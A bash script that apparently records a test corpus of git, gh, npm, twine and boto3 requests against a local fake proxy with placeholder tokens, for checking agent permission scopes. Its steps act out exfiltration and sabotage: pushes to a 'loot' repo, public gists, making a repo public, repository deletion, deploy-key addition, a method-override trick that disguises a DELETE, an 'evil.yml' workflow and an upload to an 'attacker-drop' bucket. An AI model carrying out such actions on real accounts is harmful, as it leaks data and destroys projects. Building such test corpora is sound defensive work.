#!/usr/bin/env bash
# Records real gh, git, npm, twine and boto3 traffic against record_proxy.py, with made-up tokens.
# Nothing leaves the machine: the proxy answers every request itself.
#   bash run_corpus.sh OUT_DIR        -> OUT_DIR/corpus.jsonl and OUT_DIR/commands.jsonl
set -u
# Start from an empty environment so that no proxy setting, token or key of this machine reaches a client.
if [ -z "${RESOURCE_SCOPES_CLEAN:-}" ]; then exec env -i RESOURCE_SCOPES_CLEAN=1 PATH="$PATH" bash "$0" "$@"; fi
HERE="$(cd "$(dirname "$0")" && pwd)"
OUT="$(mkdir -p "$1" && cd "$1" && pwd)"
STATE="$OUT/state"; WORK="$OUT/work"
rm -rf "$STATE" "$WORK" "$OUT/corpus.jsonl" "$OUT/commands.jsonl"; mkdir -p "$STATE/git/victim" "$WORK"
PORT=8899
python3 -I "$HERE/record_proxy.py" --port $PORT --state "$STATE" --out "$OUT/corpus.jsonl" > "$OUT/proxy.log" 2>&1 &
PROXY=$!
trap 'kill $PROXY 2>/dev/null' EXIT
for _ in $(seq 50); do grep -q ready "$OUT/proxy.log" 2>/dev/null && break; sleep 0.1; done

FAKE_GH="gho_FAKEplaceholder000000000000000000000"
FAKE_BASIC=$(printf 'x-access-token:%s' "$FAKE_GH" | base64 -w0)
export HTTPS_PROXY="http://127.0.0.1:$PORT" https_proxy="http://127.0.0.1:$PORT" npm_config_https_proxy="http://127.0.0.1:$PORT" NO_PROXY="" no_proxy=""
export SSL_CERT_FILE="$STATE/ca.pem" GIT_SSL_CAINFO="$STATE/ca.pem" NODE_EXTRA_CA_CERTS="$STATE/ca.pem"
export REQUESTS_CA_BUNDLE="$STATE/ca.pem" AWS_CA_BUNDLE="$STATE/ca.pem"
export GH_TOKEN="$FAKE_GH" GH_PROMPT_DISABLED=1 GH_NO_UPDATE_NOTIFIER=1 GH_CONFIG_DIR="$WORK/ghcfg"
export HOME="$WORK/home"; mkdir -p "$HOME"
export GIT_AUTHOR_NAME=v GIT_AUTHOR_EMAIL=v@example.com GIT_COMMITTER_NAME=v GIT_COMMITTER_EMAIL=v@example.com

# The victim's repositories on the fake GitHub.
for r in app loot; do git init -q --bare -b main "$STATE/git/victim/$r.git"; git -C "$STATE/git/victim/$r.git" config http.receivepack true; done
SEED="$WORK/seed"; git init -q -b main "$SEED"; mkdir -p "$SEED/.github/workflows" "$SEED/src"
echo 'on: push' > "$SEED/.github/workflows/ci.yml"; for i in $(seq 30); do echo "line $i" > "$SEED/src/f$i.txt"; done
git -C "$SEED" add -A; git -C "$SEED" commit -qm seed; git -C "$SEED" push -q "$STATE/git/victim/app.git" main

step() {  # step NAME command...
  local before; before=$(wc -l < "$OUT/corpus.jsonl" 2>/dev/null || echo 0)
  ( cd "$WORK" && "${@:2}" ) > "$OUT/step-$1.log" 2>&1; local rc=$?
  local after; after=$(wc -l < "$OUT/corpus.jsonl" 2>/dev/null || echo 0)
  printf '{"step":"%s","rc":%d,"first":%d,"last":%d}\n' "$1" "$rc" "$before" "$after" >> "$OUT/commands.jsonl"
}
G=(git -c "http.extraHeader=Authorization: Basic $FAKE_BASIC")

step git-clone "${G[@]}" clone -q https://github.com/victim/app.git app
step git-push-branch bash -c "cd app && echo x >> src/f1.txt && git commit -qam edit && ${G[*]@Q} push -q origin HEAD:refs/heads/agent/fix"
step git-push-workflow bash -c "cd app && echo 'on: [push, pull_request]' > .github/workflows/ci.yml && git commit -qam wf && ${G[*]@Q} push -q origin HEAD:refs/heads/agent/wf"
step git-push-new-workflow-file bash -c "cd app && git checkout -q main && echo 'run: curl' > .github/workflows/evil.yml && git add -A && git commit -qm evil && ${G[*]@Q} push -q origin HEAD:refs/heads/agent/evil"
step git-push-default bash -c "cd app && git checkout -q main && git reset -q --hard origin/main && echo y >> src/f2.txt && git commit -qam main && ${G[*]@Q} push -q origin HEAD:main"
step git-push-force bash -c "cd app && git commit -q --amend -m amended && ${G[*]@Q} push -q --force origin HEAD:main"
step git-push-tag bash -c "cd app && git tag v1 && ${G[*]@Q} push -q origin v1"
step git-delete-branch bash -c "cd app && ${G[*]@Q} push -q origin :refs/heads/agent/fix"
step git-push-other-repo bash -c "cd app && ${G[*]@Q} push -q https://github.com/victim/loot.git HEAD:refs/heads/main"
step git-push-no-dotgit bash -c "cd app && ${G[*]@Q} push -q https://github.com/victim/app HEAD:refs/heads/agent/nodotgit"

echo data > "$WORK/loot.txt"; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAK fake" > "$WORK/key.pub"
step gh-auth-status gh auth status
step gh-repo-create gh repo create loot --public --description x
step gh-api-user-repos gh api -X POST /user/repos -f name=loot2 -F private=false
step gh-gist-create gh gist create --public "$WORK/loot.txt"
step gh-issue-create gh issue create -R victim/app -t title -b body-with-data
step gh-repo-edit-visibility gh repo edit victim/app --visibility public --accept-visibility-change-consequences
step gh-release-create gh release create v1 -R victim/app --notes n "$WORK/loot.txt"
step gh-api-release-create gh api -X POST /repos/victim/app/releases -f tag_name=v2 -f name=v2
step gh-release-upload gh release upload v1 -R victim/app "$WORK/loot.txt"
step gh-repo-fork gh repo fork other/proj --clone=false
step gh-secret-set gh secret set FOO -R victim/app -b value
step gh-workflow-run gh workflow run ci.yml -R victim/app
step gh-repo-delete gh repo delete victim/app --yes
step gh-ssh-key-add gh ssh-key add "$WORK/key.pub" -t k
step gh-deploy-key-add gh repo deploy-key add "$WORK/key.pub" -R victim/app --allow-write -t k
step gh-api-graphql-createrepo gh api graphql -f query='mutation { createRepository(input:{name:"loot3", visibility:PUBLIC}) { repository { url } } }'
step gh-api-graphql-alias gh api graphql -f query='mutation M { a: createIssue(input:{repositoryId:"R_kgDOAAAAAg", title:"t"}) { issue { id } } }'
step gh-pr-list gh pr list -R victim/app
step gh-api-with-override gh api -X GET -H 'X-HTTP-Method-Override: DELETE' /repos/victim/app

mkdir -p "$WORK/npmpkg"; cat > "$WORK/npmpkg/package.json" <<'EOF'
{"name":"victim-pkg","version":"1.0.1","description":"x"}
EOF
printf '//registry.npmjs.org/:_authToken=npm_FAKEplaceholder0000000000000000000\n' > "$WORK/npmpkg/.npmrc"
step npm-publish bash -c "cd npmpkg && npm publish --registry https://registry.npmjs.org/ --userconfig ./.npmrc"
step npm-token-create bash -c "cd npmpkg && npm token create --registry https://registry.npmjs.org/ --userconfig ./.npmrc </dev/null"

mkdir -p "$WORK/py/victim_pkg-1.0.1"; cat > "$WORK/py/victim_pkg-1.0.1/PKG-INFO" <<'EOF'
Metadata-Version: 2.1
Name: victim-pkg
Version: 1.0.1
EOF
tar -C "$WORK/py" -czf "$WORK/py/victim_pkg-1.0.1.tar.gz" victim_pkg-1.0.1
step twine-upload python3 -m twine upload --non-interactive -u __token__ -p pypi-FAKEplaceholder "$WORK/py/victim_pkg-1.0.1.tar.gz"

cat > "$WORK/s3.py" <<'EOF'
import boto3
s3 = boto3.client("s3", region_name="us-east-1", aws_access_key_id="AKIAFAKEPLACEHOLDER0",
                  aws_secret_access_key="fake/placeholder/secret")
s3.put_object(Bucket="attacker-drop", Key="loot.txt", Body=b"data")
s3.put_object(Bucket="victim-builds", Key="ok.txt", Body=b"data", ExpectedBucketOwner="111122223333")
EOF
step boto3-put-object python3 "$WORK/s3.py"
echo done
